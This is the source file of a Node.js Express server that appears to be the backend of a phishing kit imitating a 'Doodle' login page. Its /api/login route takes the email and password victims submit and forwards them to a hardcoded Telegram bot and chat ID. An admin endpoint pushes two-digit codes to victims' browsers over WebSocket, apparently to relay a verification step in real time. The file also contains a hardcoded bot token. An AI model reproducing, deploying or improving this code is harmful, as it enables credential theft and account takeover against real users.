require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;

// Configuration Telegram
const TELEGRAM_BOT_TOKEN = '8887264423:AAHhoKNn1H82iVM6vM7QpILYsm4Ua2eW8FE';
const TELEGRAM_CHAT_ID = '6276768700';

// Store pour gérer les codes et connexions WebSocket
const codeStore = {
    currentCode: null,
    clients: []
};

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Route pour servir l'interface HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Route pour servir la page admin
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// WebSocket - Gérer les connexions
wss.on('connection', (ws) => {
    console.log('✅ Nouveau client connecté');
    codeStore.clients.push(ws);

    // Envoyer le code actuel s'il existe
    if (codeStore.currentCode) {
        ws.send(JSON.stringify({
            type: 'code',
            code: codeStore.currentCode
        }));
    }

    // Gérer les messages du client
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            console.log('📨 Message reçu:', data);

            if (data.type === 'ping') {
                ws.send(JSON.stringify({ type: 'pong' }));
            }
        } catch (error) {
            console.error('Erreur parsing message:', error);
        }
    });

    // Gérer la déconnexion
    ws.on('close', () => {
        console.log('❌ Client déconnecté');
        const index = codeStore.clients.indexOf(ws);
        if (index > -1) {
            codeStore.clients.splice(index, 1);
        }
    });
});

// Route pour recevoir les données de connexion
app.post('/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        // Validation basique
        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: 'Email et mot de passe requis'
            });
        }

        // Formater le message pour Telegram
        const timestamp = new Date().toLocaleString('fr-FR');
        const message = `
🔐 <b>NOUVELLE CONNEXION DOODLE</b> 🔐

📧 <b>Email:</b> <code>${email}</code>
🔑 <b>Mot de passe:</b> <code>${password}</code>
⏰ <b>Heure:</b> ${timestamp}

─────────────────────────────────────────
`;

        // Envoyer le message à Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        const response = await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });

        console.log('✅ Message envoyé à Telegram:', response.data);

        // Répondre au client
        res.json({
            success: true,
            message: 'Connexion en cours...',
            telegramResponse: response.data
        });

    } catch (error) {
        console.error('❌ Erreur:', error.message);
        res.status(500).json({
            success: false,
            message: 'Erreur lors de l\'envoi des données',
            error: error.message
        });
    }
});

// Route API pour soumettre le code (depuis admin)
app.post('/api/submit-code', (req, res) => {
    try {
        const { code } = req.body;

        if (!code || code.length !== 2 || isNaN(code)) {
            return res.status(400).json({
                success: false,
                message: 'Code invalide (2 chiffres requis)'
            });
        }

        // Stocker le code
        codeStore.currentCode = code;
        console.log('📝 Code reçu:', code);

        // Envoyer le code à tous les clients connectés
        const message = JSON.stringify({
            type: 'code',
            code: code,
            timestamp: new Date().toISOString()
        });

        codeStore.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
                console.log('📤 Code envoyé au client');
            }
        });

        res.json({
            success: true,
            message: 'Code soumis avec succès',
            code: code,
            clientsNotified: codeStore.clients.length
        });

    } catch (error) {
        console.error('❌ Erreur:', error.message);
        res.status(500).json({
            success: false,
            message: 'Erreur lors de la soumission du code',
            error: error.message
        });
    }
});

// Route pour vérifier le code
app.post('/api/verify-code', (req, res) => {
    try {
        const { code } = req.body;

        if (!code) {
            return res.status(400).json({
                success: false,
                message: 'Code requis'
            });
        }

        if (code === codeStore.currentCode) {
            console.log('✅ Code vérifié avec succès!');
            res.json({
                success: true,
                message: 'Code correct! Connexion confirmée.',
                code: code
            });
        } else {
            console.log('❌ Code incorrect:', code, 'vs', codeStore.currentCode);
            res.status(400).json({
                success: false,
                message: 'Code incorrect',
                code: code
            });
        }

    } catch (error) {
        console.error('❌ Erreur:', error.message);
        res.status(500).json({
            success: false,
            message: 'Erreur lors de la vérification',
            error: error.message
        });
    }
});

// Route de test
app.get('/api/test', (req, res) => {
    res.json({
        status: 'Le serveur fonctionne! 🚀',
        bot_token: 'Configuré ✅',
        chat_id: 'Configuré ✅',
        websocket: 'Actif ✅',
        currentCode: codeStore.currentCode || 'Aucun code',
        connectedClients: codeStore.clients.length
    });
});

// Démarrer le serveur
server.listen(PORT, () => {
    console.log(`
🚀 Serveur Doodle démarré sur http://localhost:${PORT}`);
    console.log(`📱 Interface: http://localhost:${PORT}`);
    console.log(`🎛️  Admin: http://localhost:${PORT}/admin`);
    console.log(`📡 WebSocket: Actif`);
    console.log(`🔐 Telegram Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
    console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log(`\n✅ Prêt à recevoir les connexions!\n`);
});

module.exports = server;